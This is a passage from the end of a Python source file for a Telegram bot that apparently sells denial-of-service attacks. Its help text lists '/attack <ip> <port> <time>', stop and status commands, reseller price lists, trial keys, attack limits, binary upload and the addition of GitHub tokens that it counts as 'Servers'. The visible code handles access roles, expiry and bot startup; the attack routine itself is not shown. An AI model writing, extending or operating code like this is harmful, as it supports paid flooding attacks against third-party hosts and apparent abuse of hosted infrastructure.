        await progress_msg.edit_text(f"❌ ERROR\n{str(e)}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_owner(user_id) or is_admin(user_id):
        await update.message.reply_text("🆘 HELP - AVAILABLE COMMANDS\n\nFOR ALL USERS:\n• /attack <ip> <port> <time>\n• /status - Check status\n• /stop - Stop attack\n• /id - Get your ID\n• /myaccess - Check access\n• /help - Show help\n• /redeem <key> - Redeem trial key\n\nADMIN COMMANDS:\n• /add <id> <days> - Add user\n• /remove <id> - Remove user\n• /userslist - List users\n• /approveuserslist - Pending list\n• /ownerlist - List owners\n• /adminlist - List admins\n• /resellerlist - List resellers\n• /pricelist - Show prices\n• /resellerpricelist - Reseller prices\n• /listgrp - List groups\n• /maintenance <on/off>\n• /broadcast - Send broadcast\n• /setcooldown <seconds>\n• /setmaxattack <number>\n• /gentrailkey <hours>\n• /addtoken - Add github token\n• /tokens - List tokens\n• /removetoken - Remove token\n• /removexpiredtoken\n• /binary_upload - Upload binary\n• /addowner - Add owner\n• /deleteowner - Remove owner\n• /addreseller - Add reseller\n• /removereseller - Remove reseller\n\nNeed help? Contact admin.")
    elif can_user_attack(user_id):
        await update.message.reply_text("🆘 HELP - AVAILABLE COMMANDS\n\n• /attack <ip> <port> <time>\n• /status - Check status\n• /stop - Stop attack\n• /id - Get your ID\n• /myaccess - Check access\n• /help - Show help\n• /redeem <key> - Redeem trial key\n\nNeed help? Contact admin.")
    else:
        await update.message.reply_text(f"🆘 HELP\n\n• /id - Get your user ID\n• /help - Show help\n• /redeem <key> - Redeem trial key\n\nTO GET ACCESS:\n1. Use /start to request\n2. Contact admin\n3. Wait for approval\n\nYour ID: {user_id}")

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No username"
    await update.message.reply_text(f"🆔 YOUR USER IDENTIFICATION\n\n• User ID: {user_id}\n• Username: @{username}\n\nSend this ID to admin for access.")

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_owner(user_id):
        role = "👑 PRIMARY OWNER" if is_primary_owner(user_id) else "👑 OWNER"
        expiry = "LIFETIME"
    elif is_admin(user_id):
        role = "🛡️ ADMIN"
        expiry = "LIFETIME"
    elif is_reseller(user_id):
        role = "💰 RESELLER"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
            except:
                pass
    elif is_approved_user(user_id):
        role = "👤 APPROVED USER"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
            except:
                pass
    else:
        role = "⏳ PENDING"
        expiry = "Waiting for approval"
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    await update.message.reply_text(f"🔐 YOUR ACCESS INFO\n\n• Role: {role}\n• User ID: {user_id}\n• Username: @{update.effective_user.username or 'No username'}\n• Expiry: {expiry}\n• Remaining attacks: {remaining_attacks}/{MAX_ATTACKS}\n\nAttack access: {'✅ YES' if can_user_attack(user_id) else '❌ NO'}")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /redeem <key>\nExample: /redeem TRL-XXXX-XXXX-XXXX")
        return
    key = context.args[0].upper()
    success, message = redeem_trial_key(key, user_id)
    if success:
        await update.message.reply_text(f"✅ TRIAL KEY ACTIVATED!\n{message}\n\nUse /start to access the bot.")
    else:
        await update.message.reply_text(f"❌ REDEMPTION FAILED\n{message}")

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ OPERATION CANCELLED\n\nAll pending operations cleared.\nUse /start to continue.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_binary_file))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 BOT IS RUNNING...")
    print(f"👑 Primary owners: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
    print(f"👑 Secondary owners: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
    print(f"📊 Approved users: {len(approved_users)}")
    print(f"💰 Resellers: {len(resellers)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max attacks: {MAX_ATTACKS}")
    application.run_polling()

if __name__ == '__main__':
    main()
